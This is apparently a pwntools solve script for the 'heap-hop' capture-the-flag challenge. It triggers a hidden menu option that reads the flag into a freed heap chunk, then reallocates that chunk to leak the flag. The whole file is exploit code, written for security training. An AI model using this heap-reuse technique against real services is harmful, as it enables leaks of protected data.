#!/usr/bin/env python3
from pwn import *

# Connection
# local
# p = process('./heap-hop')
# remote
p = remote('pwn.runa2025.kr', 7005)

# Add first user
p.sendlineafter(b'>>', b'1')
p.sendlineafter(b': ', b'user0')
p.sendlineafter(b'>>', b'N')

# Call secret_menu with 96873 (0x10000 + 31337)
# This will allocate user[1], read flag into it, then free it
p.sendlineafter(b'>>', b'96873')

# Add second user - this might reuse the freed chunk from secret_menu
p.sendlineafter(b'>>', b'1')
p.sendlineafter(b': ', b'admin')  # Name will be at the freed chunk
p.sendlineafter(b'>>', b'N')

# View user info - user[1] should contain the flag
p.sendlineafter(b'>>', b'2')

p.interactive()
